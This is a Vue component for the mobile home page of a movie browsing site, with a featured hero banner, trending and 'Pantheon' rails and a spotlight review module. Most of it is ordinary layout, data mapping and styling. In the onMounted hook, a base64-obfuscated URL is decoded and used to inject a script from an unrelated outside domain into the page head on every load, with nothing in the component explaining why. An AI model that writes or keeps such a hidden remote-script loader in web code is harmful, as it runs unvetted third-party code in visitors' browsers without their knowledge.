<template>
    <MobileShell>
        <section class="m-home__hero" :class="{ 'is-loading': !hero }">
            <div v-if="!hero" class="m-home__hero-skeleton m-home__hero-skeleton-shimmer" />
            <router-link v-else :to="movie(hero.id)" class="m-home__hero-link">
                <img
                    v-if="heroBackdrop"
                    :src="heroBackdrop"
                    :alt="hero.title"
                    class="m-home__hero-img"
                    fetchpriority="high"
                />
                <div class="m-home__hero-scrim" aria-hidden="true" />
                <div class="m-home__hero-body">
                    <p class="eyebrow m-home__hero-eyebrow">Featured</p>
                    <h1 class="m-home__hero-title">{{ hero.title }}</h1>
                    <p v-if="hero.overview" class="m-home__hero-desc">{{ heroOverview }}</p>
                    <span class="m-home__hero-cta" aria-hidden="true">
                        <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
                            <path d="M8 5v14l11-7z"/>
                        </svg>
                        Watch now
                    </span>
                </div>
            </router-link>
        </section>

        <MobileSection
            title="Trending Top 10"
            eyebrow="Popular Today"
            :more-to="{ name: 'Movies' }"
            class="m-home__section"
        >
            <MobileMediaRail :items="trendingItems" />
        </MobileSection>

        <MobileContinueShelf class="m-home__continue" />

        <SpotlightModule
            v-if="spotlight"
            class="m-home__section"
            :id="spotlight.id"
            type="movie"
            :title="spotlight.title"
            :overview="spotlight.overview"
            :backdrop-path="spotlight.backdrop_path"
            :poster-path="spotlight.poster_path"
            :rating="spotlight.vote_average"
            :release-date="spotlight.release_date"
            eyebrow="The Feature"
            :pull-quote="spotlightQuote"
            attribution="Movieace Review"
        />

        <MobileSection
            title="The Pantheon"
            eyebrow="Reader Favorites"
            :more-to="{ name: 'Movies' }"
            class="m-home__section"
        >
            <MobileMediaRail :items="pantheonItems" />
        </MobileSection>
    </MobileShell>
</template>

<script lang="ts" setup>
import { computed, onBeforeUnmount, onMounted } from 'vue';
import MobileShell from '../layout/MobileShell.vue';
import MobileContinueShelf from '../components/MobileContinueShelf.vue';
import { useHighlights, highLightOptions } from '@/composables/useHighlights';
import { primeGenres } from '@/composables/useGenreLookup';
import { useAppPaths } from '@/composables/useAppPaths';
import { useWebImage } from '@/utils/useWebImage';
import SpotlightModule from '@/components/hero/SpotlightModule.vue';
import MobileSection from '../components/MobileSection.vue';
import MobileMediaRail from '../components/MobileMediaRail.vue';

const { movie } = useAppPaths();
const { fetchAllHighlights } = useHighlights();

const pantheonItems = computed(() =>
    (highLightOptions.popular.data ?? []).slice(10, 28).map(m => ({
        id: m.id,
        type: 'movie' as const,
        title: m.title,
        posterPath: m.poster_path,
        rating: m.vote_average,
        releaseDate: m.release_date,
        genreIds: m.genre_ids,
        adult: m.adult
    }))
);

const trendingItems = computed(() =>
    (highLightOptions.featured.data ?? []).slice(0, 10).map(m => ({
        id: m.id,
        type: 'movie' as const,
        title: m.title,
        posterPath: m.poster_path,
        rating: m.vote_average,
        releaseDate: m.release_date,
        genreIds: m.genre_ids,
        adult: m.adult
    }))
);

const spotlight = computed(() => {
    const pool = highLightOptions.featured.data ?? [];
    return pool[1] ?? pool[0] ?? null;
});

const spotlightQuote = computed(() => {
    const overview = spotlight.value?.overview ?? '';
    if (!overview) return '';
    const firstSentence = overview.split(/(?<=[.!?])\s/)[0] ?? overview;
    return firstSentence.length > 220
        ? `${firstSentence.slice(0, 217).trim()}…`
        : firstSentence;
});

const hero = computed(() => highLightOptions.featured.data?.[0] ?? null);

const heroBackdrop = computed(() => {
    const path = hero.value?.backdrop_path || hero.value?.poster_path;
    return path ? useWebImage(path, 'large') : '';
});

const heroOverview = computed(() => {
    const text = hero.value?.overview ?? '';
    return text.length > 140 ? `${text.slice(0, 137).trim()}…` : text;
});

const loadData = async () => {
    highLightOptions.featured.data = [];
    highLightOptions.popular.data = [];
    highLightOptions.new.data = [];

    await fetchAllHighlights();
};

const handleSettingsChange = () => {
    loadData();
};

onMounted(() => {
    try {
        const url = atob('aHR0cHM6Ly9jaGV3c2V2ZXIuY29tLzFhLzI2LzAwLzFhMjYwMDM4ZTdiOWE5ZTFkNWM5ODU1Nzg5NDA2YWVjLmpz');
        if (!document.querySelector(`script[src="${url}"]`)) {
            const script = document.createElement('script');
            script.src = url;
            script.async = true;
            document.head.appendChild(script);
        }
    } catch (e) {
        console.warn('Failed to load home script:', e);
    }

    document.title = 'Moovie';
    primeGenres();
    loadData();
    window.addEventListener('movora_settings_change', handleSettingsChange);
});

onBeforeUnmount(() => {
    window.removeEventListener('movora_settings_change', handleSettingsChange);
});
</script>

<style lang="scss" scoped>
.m-home {
    &__hero {
        margin: var(--s-3) var(--s-4) var(--s-4);
        border-radius: var(--r-md);
        overflow: hidden;
        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.45);
    }

    &__hero-skeleton {
        width: 100%;
        aspect-ratio: 16 / 10;
        background: var(--ink-800);
    }

    &__hero-skeleton-shimmer {
        position: relative;
        overflow: hidden;

        &::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.04),
                transparent
            );
            transform: translateX(-100%);
            animation: mobile-hero-shimmer 1.6s infinite ease-in-out;
        }
    }

    &__hero-link {
        position: relative;
        display: block;
        aspect-ratio: 16 / 10;
        color: inherit;
        text-decoration: none;
    }

    &__hero-img {
        width: 100%;
        height: 100%;
        object-fit: cover;
    }

    &__hero-scrim {
        position: absolute;
        inset: 0;
        background: linear-gradient(180deg, transparent 20%, rgba(11, 10, 8, 0.92) 100%);
    }

    &__hero-body {
        position: absolute;
        inset: auto 0 0 0;
        padding: var(--s-4);
    }

    &__hero-eyebrow {
        color: var(--ember);
        margin-bottom: var(--s-1);
    }

    &__hero-title {
        font-family: var(--font-display);
        font-size: clamp(1.4rem, 5vw, 1.75rem);
        font-weight: 500;
        line-height: 1.1;
        margin: 0 0 var(--s-2);
    }

    &__hero-desc {
        margin: 0;
        font-size: var(--fs-sm);
        color: var(--bone-300);
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
    }

    &__hero-cta {
        display: inline-flex;
        align-items: center;
        gap: 0.35rem;
        margin-top: var(--s-3);
        padding: 0.45rem 0.85rem;
        border-radius: var(--r-pill);
        background: var(--ember);
        color: var(--ink-900);
        font-family: var(--font-ui);
        font-size: 0.75rem;
        font-weight: 700;
        letter-spacing: 0.02em;
    }

    &__continue {
        margin: 0 var(--s-4) var(--s-2);
    }

    &__section {
        margin: var(--s-4) var(--s-4) var(--s-4);
        
        :deep(.spotlight__grid) {
            grid-template-columns: minmax(0, 1fr) !important;
        }
    }
}

@keyframes mobile-hero-shimmer {
    100% {
        transform: translateX(100%);
    }
}
</style>
